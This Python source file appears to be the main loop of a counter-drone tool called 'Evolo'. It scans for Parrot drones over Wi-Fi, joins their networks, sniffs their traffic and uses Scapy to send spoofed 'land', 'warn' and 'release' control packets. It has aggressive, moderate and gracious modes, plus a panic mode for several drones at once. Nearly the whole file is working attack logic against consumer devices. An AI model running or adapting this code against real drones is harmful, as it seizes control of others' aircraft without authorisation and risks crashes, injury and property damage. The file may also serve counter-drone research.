from scapy.all import *
from wifi import Cell, Scheme
from time import sleep
import re
from multiprocessing import Process, Value


from evolo import *

#global constants
interface = "wlan0"

############################
#Process for normal attacks#
############################
def attack(parrotsAP):
	global attackInProgress, underattack
	print "Attack started"

	if not connectTo(parrotsAP, interface):
		print "Could not connect to parrot at", parrotsAP.ssid, ", exiting"
		underattack = []
		attackInProgress = 0
		return
	signalStrength = getWifiStrength(interface)

	print "Succesfully connected to", parrotsAP.ssid

	srcMAC, dstMAC, srcIP, dstIP, seqNR = sniffParrotCommunication(interface)

	if srcMAC != "": #only attack if sniffing was successfull. Otherwise simply quit
		if mode == "Aggressive":
			sendSpoofedParrotPacket("land", interface, srcMAC, dstMAC, srcIP, dstIP, seqNR, 10) #send 10 land packet
		elif mode == "Moderate":
			sendSpoofedParrotPacket("warn", interface, srcMAC, dstMAC, srcIP, dstIP, seqNR, 10)
			sleep(10)
			sendSpoofedParrotPacket("release", interface, srcMAC, dstMAC, srcIP, dstIP, 1, 1)
			sleep(5)
			if getWifiStrength(interface) > 0: #if the drone is still in wifi range land it
				sendSpoofedParrotPacket("land", interface, srcMAC, dstMAC, srcIP, dstIP, seqNR, 10)
		elif mode == "Gracious":
			while getWifiStrength(interface) > 0: #while the drone is in wifi range
				if signalStrength * 1.1 < getWifiStrength(interface): #if it is coming closer, land it
					sendSpoofedParrotPacket("land", interface, srcMAC, dstMAC, srcIP, dstIP, seqNR, 10)
				else: #otherwise warn again
					sendSpoofedParrotPacket("warn", interface, srcMAC, dstMAC, srcIP, dstIP, seqNR, 10)
					sleep(10)
					sendSpoofedParrotPacket("release", interface, srcMAC, dstMAC, srcIP, dstIP, 1, 1)
					sleep(5)
	else:
		print "No communication toward parrot at ", parrotsAP.ssid, ", exiting"
	#if attack finished, clean up the global variables
	underattack = [] #TODO global variables are not working as expectedin multithreading
	attackInProgress = 0
	disconnectFromWifi(interface)
	print "Attack finished"

##########################################
#Panic mode if multiple drones are coming#
##########################################
def panicMode():
	global underattack, attackInProgress
	while len(underattack) > 0:
		current = underattack.pop(0) #get the first parrot
		if not connectTo(current, interface):
			continue #skip if unable to connect
		srcMAC, dstMAC, srcIP, dstIP, seqNR = sniffParrotCommunication(interface)
		if srcMAC == "":
			continue #skip if sniffing timeouts
		sendSpoofedParrotPacket("land", interface, srcMAC, dstMAC, srcIP, dstIP, seqNR, 10) #send 10 land packet
	attackInProgress = 0
	disconnectFromWifi(interface)

#####################
#Program starts here#
#####################
if __name__ == '__main__':
	print "Evolo has started"
	global mode, config, underattack, attackInProgress, attackT
	underattack = []
	attackInProgress = 0 #0 - no attack, 1 - normal attack, 2 - panic mode
	mode = ""
	config = ""
	while True: #scan, attack, repeat
		global underattack, attackInProgress
		mode = readKnobState()
		whitelist, config = readConfig()
		print underattack
		newParrots = scanForParrots(interface, whitelist, underattack)
		if len(newParrots) > 0: #only work if there are new drones nearby
			if attackInProgress == 0 and len(newParrots) == 1: #no attack in progress, only one parrot found
				underattack = getAPsMAC(newParrots)
				attackInProgress = 1
				attackT = Process(target=attack, args=(newParrots[0],)) # launch normal attack
				attackT.start()
			elif attackInProgress == 0 and len(newParrots) > 1: #no attack in progress, more than one parrot found -> panic mode
				attackInProgress = 2
				underattack = getAPsMAC(newParrots)
				panicModeT = Process(target=panicMode, args=())
				panicModeT.start()
			elif attackInProgress == 1: #if there is a normal attack in progress, but there is an other parrot coming
				attackInProgress = 2
				attackT.terminate() #stop normal attack
				disconnectFromWifi(interface)
				underattack += getAPsMAC(newParrots)
				panicModeT = Process(target=panicMode, args=())
				panicModeT.start()
			elif attackInProgress == 2: #already in panic mode, add new parrots
				underattack += getAPsMAC(newParrots)
		else: #no drone: wait and scan again
			sleep(1)
